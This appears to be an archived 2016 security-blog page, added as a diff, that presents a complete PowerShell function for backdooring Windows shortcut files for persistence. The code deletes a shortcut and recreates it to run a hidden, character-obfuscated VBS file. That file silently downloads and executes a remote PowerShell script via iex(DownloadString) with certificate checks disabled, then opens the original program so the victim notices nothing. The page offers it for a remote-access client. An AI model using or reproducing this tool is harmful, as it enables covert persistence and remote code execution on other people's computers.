@@ -1,0 +1,194 @@
+<html><head><title>Injecting code into shortcuts for persistence</title> <style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head> <body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 11pt"><pre><hr>|| Injecting code into shortcuts for persistence, author: xor-function || 02/07/2016 || <a style="text-decoration: none" href="../"><span style="text-decoration: none">Back to main</span></a><hr></pre><pre>
+
+Modifying shortcuts (.lnk) to execute arbitrary code is nothing new. I noticed many of 
+the methods did not seem to incorporate obfuscation and/or insure the shortcuts original target 
+program started. 
+
+So I created a powershell function to modify a shortcut to execute the original program as
+intended, but also executes a command string to download and execute some powershell code.
+This was done by linking to a generated vbs script which obfuscates the command string and
+runs the original program.
+
+The function code is below, it's going to be integrated into the async-client to serve
+as a option for persistence.
+
+===[ BOF ]===
+
+# Part of the Fathomless project, for use with the async-client
+
+#[->] requires the name of the shortcut along with a url hosting your PS script
+#[->] example: shortcut-inject "Chrome.lnk" "https://your-domain.com/ps-script"
+
+function shortcut-inject { 
+
+	[CmdletBinding()] Param(
+	
+	[Parameter(Position=0, Mandatory = $true)]
+	[String]
+	$shortcut,
+	
+	[Parameter(Position=1, Mandatory = $true)]
+	[String]
+	$scriptUrl
+
+	)
+	
+	if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' ) { 
+	
+	
+		#[->] internal function for variable name randomization
+		function rand-str { 
+	
+			$rint = get-random -max 10 -min 3
+			$charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
+			1..$rint | % { $rchr += $charArray | get-random }
+			$randstr = [string]::join("", ($rchr))
+		
+			return $randstr	
+		}
+	
+		#[->] Passing .lnk full path as variable
+		$shortcutFullname = (gci $shortcut).Fullname
+		$location = (gci $shortcut).DirectoryName
+		$lnkName = (gci $shortcut).Name
+	
+		#[->] extracting original properties from selected icon
+		$wsh = New-Object -COM WScript.Shell
+		$targetPath = $wsh.CreateShortcut("$shortcutFullname").TargetPath
+		$workingDir = $wsh.CreateShortcut("$shortcutFullname").WorkingDirectory
+		# $iconloc    = $wsh.CreateShortcut("$shortcutFullname").IconLocation
+		# $descript   = $wsh.CreateShortcut("$shortcutFullname").Description
+	
+		#[->] Get name of binary without full path to use as icon target
+		$targetBinary = (gci $targetPath).Name
+
+		#####################################
+		#[->] VBS CODE GENERATION BEGINS [<-]
+	
+		#[->] prep command download string to be passed to obfuscation engine
+		$cmdstring = 'cmd /q /c powershell.exe -w hidden -c "&{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};iex(New-Object System.Net.Webclient).DownloadString(''' + $scriptUrl + ''')}" '
+	
+		#[->] create vbs script then change attribute to hidden
+		$saveDir = $env:localappdata + '\'
+	
+		#[->] set variables for template generation
+		$newline = "`r`n"
+		$vbsfile = $newline
+
+		#[->] initialize first function in vbs script 
+		$randfunc1 = rand-str
+		$vbsfile += 'Function ' + $randfunc1 + '() ' + $newline
+
+		#[->] Obfuscate first wscript command string
+		$cmdstrArray = @()
+		[int]$ccnt = '1'
+		foreach ( $char in $cmdstring.GetEnumerator() ) {
+
+			#[->] translate to ascii value then do math ops on it
+			$val = [Byte][Char]$char
+			$rnum = get-random -max 9 -min 1
+			$nval = [int]$val - [int]$rnum
+			$hval = [int]$nval / '2'
+
+			if ( [int]$ccnt -eq '1' ) 
+			{
+
+				#[->] genrate random variable name then append it to array
+				$rvarstr = rand-str
+				$rvarstr += rand-str
+				$cmdstrArray += $rvarstr
+				$vbsfile += $rvarstr + ' =' + ' chr(' + $hval + '+' + $hval + '+' + $rnum + ')'
+
+			
+			} else {
+
+				$vbsfile += ' &chr(' + $hval + '+' + $hval + '+' + $rnum + ')'
+	
+			}
+		
+			#[->] create random legnth of char use 
+			$randval = get-random -max 12 -min 1 
+			if ( $randval -eq '8' ) { $vbsfile += $newline; [int]$ccnt = 0 }
+			$ccnt++
+
+		}
+
+		#[->] concatinate vars to single command string
+		[int]$cnt = 1
+		foreach ( $randvar in $cmdstrArray )  {
+		
+			if ( $cnt -eq '1' ) 
+			{ 
+				$mainRvar = rand-str
+				$vbsfile += $newline
+				$vbsfile += $mainRvar + ' = ' + $randvar 
+		
+			} else {
+		
+				$vbsfile += ' + ' + $randvar 
+		
+			}
+		
+			$cnt++
+		
+		}
+	
+		$fso1 = rand-str
+		$vbsfile += $newline
+		$vbsfile += 'set ' + $fso1 + ' = ' + 'createObject("wscript.shell")' + $newline
+		$vbsfile += $fso1 + '.run ' + $mainRvar + ',' + ' 0, ' + 'false' + $newline
+		$vbsfile += 'End Function' + $newline
+	
+		#[->] initialize second function 
+		$randfunc2 = rand-str
+		$vbsfile += 'Function ' + $randfunc2 + '() ' + $newline
+	
+		$fso2 = rand-str
+		$vbsfile += 'set ' + $fso2 + ' = ' + 'createObject("wscript.shell")' + $newline
+	
+		$vbsfile += $fso2 + '.run ' +  '"' + 'cmd /c ' + 'start ' + $targetBinary +  '"' + ',' + ' 0, ' + 'false' + $newline
+		$vbsfile += 'End Function' + $newline
+	
+		$vbsfile += $randfunc1 + $newline + $randfunc2
+	
+		#[->] vbs script in "vbsfile" is ready to be written to disk
+	
+		$rand = rand-str; $vbsName = $rand + '.vbs'
+		$vbspath = $saveDir + $vbsName
+	
+		set-content $vbspath $vbsfile -Encoding ASCII
+		$vbsAtt = get-item $vbspath
+		$vbsAtt.attributes="Hidden"
+	
+		#################################
+		#[->] VBS CODE GENERATION END [<-]
+	
+		#[->] Delete original shortcut 
+		Remove-Item $shortcutFullname
+	
+		#[->] Modify values acquired from original shortcut 
+		$wsh2 = New-Object -COM WScript.Shell
+		$newSc = $shortcutFullname
+		$newShortcut = $wsh2.CreateShortcut("$newSc")
+		$newShortcut.TargetPath = "c:\windows\system32\cmd.exe"
+		$newShortcut.WorkingDirectory = $workingDir
+
+		#[->] Set shortcut arguments	
+		$args = '/c ' + '"' + $vbspath + '"'
+		$newShortcut.Arguments = "$args"
+		$newIcon = $targetPath + ',0'
+		$newShortcut.IconLocation = "$newIcon"
+		$newShortcut.Save();
+	
+		# write-output "[+] Icon location: $newIcon"
+		write-output "[+] finished injecting command string into shortcut."
+
+	} else { write-output "[!] FAilED!`n[!]You need to use a proper URL format ex: http://ex_domain.com/script or https://ex_domain.com/script" }
+
+}
+ 
+ 
+===[ EOF ]===
+
+
+</pre></body></html>
